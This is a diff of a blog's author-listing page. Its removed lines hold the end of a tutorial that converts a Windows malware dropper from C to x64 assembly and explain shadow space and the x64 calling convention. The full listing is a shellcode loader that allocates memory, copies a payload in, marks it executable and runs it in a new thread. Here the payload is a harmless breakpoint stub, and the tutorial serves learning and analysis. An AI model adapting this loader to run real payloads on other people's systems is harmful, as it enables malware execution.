-<span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="no">rbx</span><span class="w">         </span><span class="c1">; Go back to the stored instruction address</span>
-<span class="w">    </span><span class="nf">ret</span>
-</code></pre></div>
-
-<p>To call the routine, just do this:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">getchar</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">shadow_call</span>
-</code></pre></div>
-
-<p>But honestly, I think it's less complicated to just do the handling of shadow space yourself.</p>
-<p>Shadow spaces threw me off a bit when I was researching about this, but everything I said above should be enough of an explanation. If however you want more then go <a href="https://retroscience.net/x64-assembly.html">here</a> and then <a href="https://devblogs.microsoft.com/oldnewthing/20160623-00/?p=93735">here</a>.</p>
-<h2 id="microsoft-x64-calling-convention">Microsoft x64 Calling Convention</h2>
-<p>It is also important to note that the calling convention for functions is different for Windows compared to other operating systems.</p>
-<p>As a quick reference, if you are going to pass parameters to a function you need to use registers <code>rcx</code>, <code>rdx</code>, <code>r8</code>, and <code>r9</code> for the first, second, third, and fourth parameters respectively.</p>
-<p>Here's an example from our code:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="c1">// Make new buffer as executable</span>
-<span class="w">    </span><span class="n">rv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualProtect</span><span class="p">(</span><span class="n">exec_mem</span><span class="p">,</span><span class="w"> </span><span class="n">payload_len</span><span class="p">,</span><span class="w"> </span><span class="n">PAGE_EXECUTE_READ</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">oldprotect</span><span class="p">);</span>
-</code></pre></div>
-
-<p>In assembly, we supply the parameters like so:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="c1">;; Make new buffer as executable</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span><span class="w">      </span><span class="c1">;; First parameter</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span><span class="w">    </span><span class="c1">;; Second parameter</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x20</span><span class="w">             </span><span class="c1">;; Third parameter</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">old_protect</span><span class="p">]</span><span class="w">    </span><span class="c1">;; Fourth parameter</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">          </span><span class="c1">;; Reserve shadow space</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">VirtualProtect</span><span class="w">   </span><span class="c1">;; Call function</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">          </span><span class="c1">;; Release shadow space</span>
-</code></pre></div>
-
-<p>For functions that require more than four parameters, the stack needs to be utilized. This can get confusing so let me point you to <a href="https://sonictk.github.io/asm_tutorial/#windows:thewindowtothehardware/themicrosoftx64callingconvention">this post</a> as it has diagrams for visualization.</p>
-<h2 id="the-final-code">The final code</h2>
-<p>The rest of the code can be converted using the concepts I've described above. Here is the fully converted code:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
-<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="nf">msg_hello</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hello</span><span class="w"> </span><span class="no">world</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_exec_addr</span><span class="w">   </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">exec_mem</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_pload_addr</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">payload</span><span class="w"> </span><span class="no">addr</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">   </span>
-<span class="w">    </span><span class="no">msg_format</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;%</span><span class="mi">-20</span><span class="no">s</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="no">x</span><span class="err">%</span><span class="mi">-016</span><span class="no">p</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_hit_me</span><span class="w">  </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">Hit</span><span class="w"> </span><span class="no">me</span><span class="p">!</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0xd</span><span class="p">,</span><span class="w"> </span><span class="mi">0xa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-
-<span class="w">    </span><span class="c1">;; 4 byte payload</span>
-<span class="w">    </span><span class="nf">payload</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0x90</span><span class="p">,</span><span class="w"> </span><span class="mi">0xCC</span><span class="p">,</span><span class="w"> </span><span class="mi">0xC3</span>
-<span class="w">    </span><span class="nf">payload_len</span><span class="w">     </span><span class="no">db</span><span class="w">  </span><span class="mi">4</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.bss</span><span class="w">    </span>
-<span class="w">    </span><span class="no">exec_mem</span><span class="w">    </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span>
-<span class="w">    </span><span class="nf">old_protect</span><span class="w"> </span><span class="no">resb</span><span class="w">    </span><span class="mi">8</span><span class="w">   </span>
-
-<span class="no">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualAlloc</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">VirtualProtect</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">RtlMoveMemory</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">getchar</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">CreateThread</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">WaitForSingleObject</span>
-
-<span class="nl">main:</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
-
-<span class="w">    </span><span class="c1">;; Allocate a memory buffer for payload.</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x3000</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="mi">0x4</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">VirtualAlloc</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="no">mov</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">],</span><span class="w"> </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_pload_addr</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="no">payload</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="no">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_format</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_exec_addr</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="c1">;; Copy payload to new buffer</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="no">r8</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8b</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">     </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">RtlMoveMemory</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="c1">;; Make new buffer as executable</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">dl</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">payload_len</span><span class="p">]</span>
-<span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="mi">0x20</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">old_protect</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">     </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">VirtualProtect</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w">     </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_hit_me</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">         </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">printf</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span>
-
-<span class="w">    </span><span class="no">sub</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="w">             </span>
-<span class="w">    </span><span class="no">call</span><span class="w">    </span><span class="no">getchar</span>
-<span class="w">    </span><span class="nf">add</span><span class="w">     </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-
-<span class="w">    </span><span class="nf">pop</span><span class="w"> </span><span class="no">rax</span>
-
-<span class="w">    </span><span class="c1">;; If all good, run the payload </span>
-<span class="w">    </span><span class="nf">jz</span><span class="w">  </span><span class="no">ifrvzero</span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">exec_mem</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">r9</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">CreateThread</span>
-
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">0xFFFFFFFF</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">WaitForSingleObject</span>
-
-<span class="nl">ifrvzero:</span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
-</code></pre></div>
-
-<p>As mentioned before, I did my best to match the structure of the C code to the assembly code to make it easy to compare how one section was translated to the other. There are other parts like the <code>jz ifrvzero</code> conditonal jump that I didn't discuss, but those can be easily be understood if you know the basics in assembly.</p>
-<p>I've also uploaded the code on it's own repository <a href="https://github.com/accidentalrebel/malware-dropper-x64-win-assembly">here</a>. Updates and fixes to the code will be pushed there.</p>
-<hr />
-<p>A lot of the concepts I've described in this post were the lessons I learned while working on this project. Most of these can be researched but I'm hoping that collecting them in one location would benefit the next bloke who is crazy like me to do the same.</p>
-<p>Feel free to reach out to me on <a href="https://twitter.com/accidentalrebel">Twitter</a> or <a href="https://www.linkedin.com/in/juan-karlo-licudine/">LinkedIn</a> for any questions or comments.</p>
-        </div>
-
-        <div class="tags">
-            <a href="../tag/malware.html" class="tag">malware</a>
-            <a href="../tag/assembly.html" class="tag">assembly</a>
-            <a href="../tag/reverse-engineering.html" class="tag">reverse-engineering</a>
-        </div>
-    </article>
 
 <nav class="pagination">
         <a href="../author/accidentalrebel2.html">&laquo; Previous</a>
@@ -1027,6 +630,7 @@ The "powershell" string has 11 characters so we use 16.</p>
         <a href="../author/accidentalrebel13.html">13</a>
         <a href="../author/accidentalrebel14.html">14</a>
         <a href="../author/accidentalrebel15.html">15</a>
+        <a href="../author/accidentalrebel16.html">16</a>
 
     <a href="../author/accidentalrebel4.html">Next &raquo;</a>
 </nav>
